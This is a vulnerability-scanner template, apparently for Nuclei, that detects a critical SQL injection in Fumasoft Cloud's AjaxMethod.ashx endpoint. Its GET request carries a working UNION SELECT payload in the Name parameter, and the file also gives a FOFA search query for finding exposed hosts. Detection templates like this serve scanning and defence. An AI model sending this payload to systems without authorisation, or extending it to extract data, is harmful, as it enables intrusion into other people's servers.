http:
- matchers:
  - part: body
    type: word
    words:
    - '{{md5(num)}}'
  - status:
    - 500
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y''+union+select+substring(sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''{{num}}'')),3,32)--'
id: fumasoft-sqli
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: 'There is a SQL injection vulnerability in the AjaxMethod.ashx file
    of Fumasoft Cloud. Attackers can obtain server permissions through the vulnerability

    '
  metadata:
    fofa-query: title="Fumeng Cloud"
    max-request: 1
    verified: true
  name: Fumasoft Cloud - SQL Injection
  severity: critical
  tags: fumasoft,sqli,vuln
variables:
  num: '999999999'
